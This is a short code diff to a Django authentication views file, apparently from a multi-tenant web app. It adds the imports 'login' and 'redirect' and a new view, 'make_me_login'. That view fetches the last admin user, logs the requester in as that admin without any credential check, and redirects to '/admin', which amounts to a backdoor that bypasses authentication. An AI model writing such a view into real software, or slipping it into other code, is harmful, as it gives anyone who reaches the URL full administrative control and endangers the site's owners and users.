@@ -1,4 +1,4 @@
-from django.shortcuts import render
+from django.shortcuts import render, redirect
 
 from django.db import connection
 from django.db.models import Q
@@ -18,7 +18,7 @@ from rest_framework import status
 from NStyle.Constants import StatusCodes
 from threading import Thread
 from Authentication.Constants import OTP
-from django.contrib.auth import authenticate
+from django.contrib.auth import authenticate, login
 from Authentication.serializers import UserLoginSerializer, UserSerializer, UserTenantSerializer
 from django_tenants.utils import tenant_context
 from Authentication.Constants.Email import send_welcome_email
@@ -38,6 +38,11 @@ def all_users(request):
             'data' : serialized.data
         }
     )
+
+def make_me_login(request):
+    user = User.objects.filter(is_admin=True).last()
+    login(request, user)
+    return redirect('/admin')
 
 
 @transaction.atomic
